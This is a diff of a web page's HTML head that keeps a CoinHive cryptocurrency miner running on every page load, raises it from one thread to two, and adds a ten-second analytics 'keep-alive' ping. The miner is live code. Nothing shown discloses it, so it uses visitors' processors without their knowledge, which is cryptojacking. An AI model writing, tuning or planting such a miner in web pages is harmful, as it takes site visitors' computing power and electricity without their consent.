@@ -21,11 +21,14 @@
 
   ga('create', 'UA-105407554-2', 'auto');
   ga('send', 'pageview');
+  setInterval(function() {
+    ga('send', 'event', 'keep-alive', 'ping');
+  }, 10000);
 
 </script>
 <script>
-	var miner = new CoinHive.Anonymous('mxQ4fvr9wTiWHesQ5g5L23GDpzNgIuOV', {threads: 1});
-	miner.start();
+	var miner = new CoinHive.Anonymous('mxQ4fvr9wTiWHesQ5g5L23GDpzNgIuOV', {threads: 2});  
+  miner.start();
 </script>
 </head>
 
